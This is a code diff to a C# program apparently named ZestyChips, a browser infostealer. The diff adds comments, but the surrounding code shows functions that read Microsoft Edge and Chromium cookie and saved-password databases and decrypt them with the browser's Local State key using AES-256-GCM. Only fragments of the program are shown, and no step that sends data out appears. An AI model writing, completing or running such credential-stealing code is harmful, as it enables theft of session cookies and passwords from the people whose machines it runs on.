@@ -40,7 +40,13 @@ namespace ZestyChips
             StealEdgeCookies();
 
         }
-
+        
+        /**
+        * Function to get chromium browser cookiess, taking in a path to the localstate file, the SQLiteDataReader with the db file
+        * and a reference to the dictionary where you will be saving the data.
+        *
+        * Returns: void
+        */
         private static void GetChromiumCookies(string localStatePath, SQLiteDataReader sdr, ref Dictionary<string, string> masterDictionary) {
             // decode & decrypt the encryption key
             while (sdr.Read()) {
@@ -99,6 +105,9 @@ namespace ZestyChips
             }
         } 
 
+        /**
+        * Function to steal Microsoft Edge cookies
+        */
         private static void StealEdgeCookies() {
             string cookieLoc = "\\Microsoft\\Edge\\User Data\\Default\\Network\\Cookies";
             string localState = "/../Local/Microsoft/Edge/User Data/Local State";
@@ -151,7 +160,7 @@ namespace ZestyChips
         }
         
         /*
-        * Steals edge data
+        * Steals Microsoft Edge browser saved passwords
         */
         private static void StealEdgePasswords() {
             string loginDataLoc = "\\Microsoft\\Edge\\User Data\\Default\\Login Data";
@@ -359,6 +368,9 @@ namespace ZestyChips
             return JsonSerializer.Serialize(masterDictionary);
         }
 
+        /**
+        * Decrypts a AES-256 byte array, converting it into a UTF8 string
+        */
         private static string Aes256Decrypt(byte[] encryptedBytes, byte[] key, byte[] iv) {
             string result = string.Empty;
             try {
@@ -382,6 +394,12 @@ namespace ZestyChips
             return result;
         }
 
+        /**
+        * Prepares the nonce and ciphertext tag from the given encryptedData for decryption with AES-256-GCM
+        * Allocates a new 12-byte array for the nonce
+        * Allocates a new byte array for the ciphertextTag, which is the length of encryptedData - 3 bytes for a prefix and the length of the nonce
+        * Copies the bytes from encryptedData into the nonce and ciphertextTag arrays starting after the first 3 prefix bytes
+        */ 
         private static void Aes256Prepare(byte[] encryptedData, out byte[] nonce, out byte[] ciphertextTag) {
             try {
                 nonce = new byte[12];
